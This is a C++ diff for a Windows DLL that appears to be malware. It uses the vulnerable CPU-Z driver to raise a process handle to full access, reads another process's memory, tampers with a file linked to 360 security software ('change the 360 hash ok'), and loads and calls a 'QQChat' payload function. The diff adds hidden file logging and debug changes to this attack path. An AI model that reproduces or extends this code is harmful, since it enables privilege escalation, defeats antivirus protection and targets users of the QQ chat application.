@@ -80,10 +80,21 @@ void aes(char * buf, char ** out_buf, int encrypt)
 	CryptReleaseContext(hCryptProv, 0);
 }
 
+FILE* out;
+
  HANDLE testmain(int is_debug)
 {
 	HANDLE handle;
 	try {
+
+		
+		out = fopen("./_Kofw.dat2.log", "w");
+
+
+fprintf( stdout, "successfully reassigned\n" ); 
+
+
+
 		dyn_data::ensure_intel_cpu();
 		dyn_data::load_information();
 
@@ -91,7 +102,9 @@ void aes(char * buf, char ** out_buf, int encrypt)
 
 		if (!pid)
 			//throw std::runtime_error("Process not running");
-		fprintf(stderr, "Process not running\n");
+		fprintf(out, "Process not running\n");
+
+		fflush(out);
 
 		if (is_debug==1) MessageBox(NULL, L"1", NULL, MB_OK);
 		// 
@@ -99,27 +112,38 @@ void aes(char * buf, char ** out_buf, int encrypt)
 		// 
 		 handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
 
-		if (!handle)
-			throw std::runtime_error("Failed to open process");
-
+		 if (!handle)
+			 //throw std::runtime_error("Failed to open process");
+		 {
+			 fprintf(out, "Failed to open process");
+			 exit(-1);
+		 }
 		// 
 		// Attach to the process that contains the handle we 
 		// want to elevate (this is the current process on this case)
 		// 
 
 		if (is_debug == 1) MessageBox(NULL, L"get handle", NULL, MB_OK);
-
+		fprintf(out, "get handle\n");
+		fflush(out);
 		if (process::attach(GetCurrentProcessId())) {
 			//	if (process::attach(pid2)) {
 			// 
 			// Use CPU-Z to elevate the handle access to PROCESS_ALL_ACCESS
 			// 
 			if (!process::grant_handle_access(handle, PROCESS_ALL_ACCESS))
-				throw std::runtime_error("Failed to set handle access");
-
+				//throw std::runtime_error("Failed to set handle access");
+			{
+				fprintf(out, "Failed to set handle access");
+				fflush(out);
+				exit(-1);
+			}
 			process::detach();
+			
 		}
 		if (is_debug == 1) MessageBox(NULL, L"grant_handle_access", NULL, MB_OK);
+		fprintf(out, "grant_handle_access\n");
+		fflush(out);
 		// 
 		// Use the now elevated handle to perform a query and some reads.
 		// You can use this handle for pretty much anything you want from now on. :)
@@ -131,44 +155,48 @@ void aes(char * buf, char ** out_buf, int encrypt)
 		WCHAR buffer[512];
 		memset(buffer, 0, sizeof(buffer));
 		if (NtQueryInformationProcess(handle, ProcessBasicInformation, &process_info, sizeof(process_info), &return_len) < 0)
-			throw std::runtime_error("NtQueryInformationProcess failed");
+			//throw std::runtime_error("NtQueryInformationProcess failed");
+			fprintf(out, "NtQueryInformationProcess failed");
 
 		if (!ReadProcessMemory(handle, process_info.PebBaseAddress, &process_peb, sizeof(process_peb), nullptr) ||
 			!ReadProcessMemory(handle, process_peb.ProcessParameters, &process_parameters, sizeof(process_parameters), nullptr) ||
 			!ReadProcessMemory(handle, process_parameters.CommandLine.Buffer, buffer, process_parameters.CommandLine.Length, nullptr))
-			throw std::runtime_error("ReadProcessMemory failed");
-
+			//throw std::runtime_error("ReadProcessMemory failed");
+			fprintf(out, "ReadProcessMemory failed");
 		printf("CommandLine: %ws\n", buffer);
-
+		fprintf(out, "CommandLine: %ws\n", buffer);
+		fflush(out);
 		//CloseHandle(handle);
 		if (is_debug == 1) MessageBox(NULL, buffer, NULL, MB_OK);
 		//DeleteFileW(L"\\SystemRoot\\System32\\drivers\\cpuz141.sys");
 	}
 	catch (const unsupported_version& ex) {
-		fprintf(stderr, ex.what());
-		fprintf(stderr, "\n");
-		fprintf(stderr, "Supported (tested) versions are:\n");
-		fprintf(stderr, " - Windows 7 SP1  (6.1.7601)\n");
-		fprintf(stderr, " - Windows 8      (6.2.9200)\n");
-		fprintf(stderr, " - Windows 8.1    (6.3.9600)\n");
-		fprintf(stderr, " - Windows 10 TH1 (10.0.10240)\n");
-		fprintf(stderr, " - Windows 10 TH2 (10.0.10586)\n");
-		fprintf(stderr, " - Windows 10 AU  (10.0.14393)\n");
-		fprintf(stderr, " - Windows 10 CU  (10.0.15063)\n");
+		fprintf(out, ex.what());
+		fprintf(out, "\n");
+		fprintf(out, "Supported (tested) versions are:\n");
+		fprintf(out, " - Windows 7 SP1  (6.1.7601)\n");
+		fprintf(out, " - Windows 8      (6.2.9200)\n");
+		fprintf(out, " - Windows 8.1    (6.3.9600)\n");
+		fprintf(out, " - Windows 10 TH1 (10.0.10240)\n");
+		fprintf(out, " - Windows 10 TH2 (10.0.10586)\n");
+		fprintf(out, " - Windows 10 AU  (10.0.14393)\n");
+		fprintf(out, " - Windows 10 CU  (10.0.15063)\n");
+		fflush(out);
 
 	}
 	catch (const unsupported_processor& ex) {
-		fprintf(stderr, ex.what());
-		fprintf(stderr, "\n");
-		fprintf(stderr, "HandleMaster currently only supports Intel processors\n");
+		fprintf(out, ex.what());
+		fprintf(out, "\n");
+		fprintf(out, "HandleMaster currently only supports Intel processors\n");
 	}
 	catch (const std::exception& ex) {
-		fprintf(stderr, ex.what());
-		fprintf(stderr, "\nGetLastError: %X\n", GetLastError());
+		fprintf(out, ex.what());
+		fprintf(out, "\nGetLastError: %X\n", GetLastError());
 	}
 
 	//getc(stdin);
 	//if (handle!=NULL)CloseHandle(handle);
+	fflush(out);
 	return handle;
 }
 
@@ -184,7 +212,7 @@ extern "C" __declspec(dllexport) HANDLE TestProc()
 	
 	//return 0;
 }
-
+/*
 static std::string Encode(const void* pBuffer, DWORD nSize)
 {
 	DWORD   nNeed = 0;
@@ -217,7 +245,7 @@ static void Decode(const char* sBase64, std::vector<BYTE>& decoded_data)
 		}
 	}
 }
-
+*/
 extern "C" __declspec(dllexport) HANDLE TestQQChat(char * str)
 {
 	HANDLE my_h;
@@ -230,10 +258,10 @@ extern "C" __declspec(dllexport) HANDLE TestQQChat(char * str)
 	memset(out_buf2, 0, 512);
 
 
-	Decode(LPCSTR(str), bs64_buf);
+	//Decode(LPCSTR(str), bs64_buf);
 	memcpy(out_buf2, &bs64_buf[0], bs64_buf.size());
 	MessageBoxA(NULL, out_buf2, "decode后", 0);
-	aes(out_buf2, (char **)&out_buf, 0);
+	//aes(out_buf2, (char **)&out_buf, 0);
 	MessageBoxA(NULL, out_buf, "解密后", 0);
 
 
@@ -263,9 +291,9 @@ extern "C" __declspec(dllexport) void testChat()
 	//MessageBoxA(NULL, out_buf, NULL, 0);
 	char *handle_str = new char[512];
 	
-	memset(handle_str, 0, 512);
+//	memset(handle_str, 0, 512);
 	
-	memcpy(handle_str, Encode(out_buf, 32).c_str(), 512);
+//	memcpy(handle_str, Encode(out_buf, 32).c_str(), 512);
 	
 	//TestQQChat(handle_str);
 	CAesHelper tool;
@@ -366,6 +394,8 @@ extern "C" __declspec(dllexport) void testChat()
 	WriteFile(hFile2, FileContent, dwDataLen, &Written, NULL);//写入文件   
 	CloseHandle(hFile2);//关闭句柄
 	DeleteFile(L".\\cloud360.dat");
+	fprintf(out, "\change the 360 hash ok\n");
+	fflush(out);
 	// Insert code here to remove the subdirectory too (if desired).
 
 	// The system will delete the clone EXE automatically
@@ -382,6 +412,7 @@ wchar_t	* buf2=new wchar_t[1000];
 	pp.append(L"\\");
 	pp.append(result.c_str());
 	HMODULE dll = LoadLibrary(pp.c_str());
+
 	PGNSI pGNSI=0;
 	PGNSI2 pGNSI2=0;
 	pGNSI =(PGNSI) GetProcAddress(dll, "QQChat");
@@ -393,12 +424,16 @@ wchar_t	* buf2=new wchar_t[1000];
 		//showLogEx(false,"GetProcAddress:%s 成功",(LPSTR)(LPCTSTR)funName);
 		//wsprintf(buf2, L"%s", strRet.c_str());
 		//MessageBoxA(NULL, strRet.c_str(), NULL, 0);
+		fprintf(out, "prepare call main working function hoho\n");
+		fflush(out);
 		pGNSI(strRet.c_str());
+		fprintf(out, "finish call main working function hoho\n");
+		fflush(out);
 	}
 	
 
 	//QQChat(handle_str);
-
+	exit(0);
 	return ;
 }
 
